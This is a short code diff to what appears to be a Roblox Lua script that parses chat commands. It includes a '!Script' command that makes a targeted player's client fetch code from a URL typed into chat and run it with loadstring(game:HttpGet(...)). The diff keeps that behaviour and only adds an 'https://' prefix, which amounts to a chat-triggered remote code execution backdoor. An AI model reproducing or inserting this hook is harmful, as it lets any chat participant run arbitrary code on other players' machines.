@@ -61,7 +61,7 @@ for i, v in pairs(Players) do
 
 			local Group = {}
 
-			for v in Message:gmatch("[^%s]+") do
+			for v in Command:gmatch("[^%s]+") do
 			table.insert(Group, v)
 			end
 
@@ -181,7 +181,7 @@ game.Players.PlayerAdded:Connect(function(Player)
 					
 			if Group[1] == "!Script" then
 				if Group[2] == game.Players.LocalPlayer.DisplayName then
-					loadstring(game:HttpGet(Group[3]))()
+					loadstring(game:HttpGet("https://".. Group[3]))()
 				end
 			end
 
